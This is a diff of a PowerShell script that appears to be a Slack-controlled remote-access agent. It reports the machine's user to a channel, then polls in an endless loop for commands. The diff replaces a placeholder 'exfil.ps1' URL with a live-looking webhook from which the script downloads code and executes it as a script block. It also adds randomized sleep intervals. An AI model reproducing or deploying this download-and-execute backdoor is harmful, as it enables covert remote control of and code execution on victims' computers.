@@ -1,5 +1,6 @@
 # slack token: https://app.slack.com/app-settings/.../.../oauth
 # channel id: right click channel -> "Channel details" -> "View channel details" -> at the bottom you will see "Channel ID"
+# yea yea, i know lol
 $slackToken = ""
 $channelId  = ""
 
@@ -70,6 +71,7 @@ $joinResponse = slack-wrapper -txt ":desktop_computer:: ``$([System.Security.Pri
 $threadTs = [string]$joinResponse.ts
 $lastMsg = [decimal]$threadTs
 
+
 while ($true) {
 
     try {
@@ -136,9 +138,9 @@ while ($true) {
 
                     if ($u) { $remArgs.u = $true}
 
-                    $code = Invoke-RestMethod -Uri "https://example.com/exfil.ps1"
-                    $scrBlock = [ScriptBlock]::Create($code) # load the script
-                    $result = & $scrBlock @remargs # exec and pass arguments
+                    $code = Invoke-RestMethod -Uri "https://frosty-brook-8666.tines.com/webhook/tool/remcode"
+                    $scrBlock = [ScriptBlock]::Create($code)
+                    $result = & $scrBlock @remargs
 
                     $status = ":white_check_mark: Executed"
 
@@ -200,5 +202,5 @@ while ($true) {
         Write-Warning $_
     }
 
-    Start-Sleep -Seconds 10
+    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)
 }
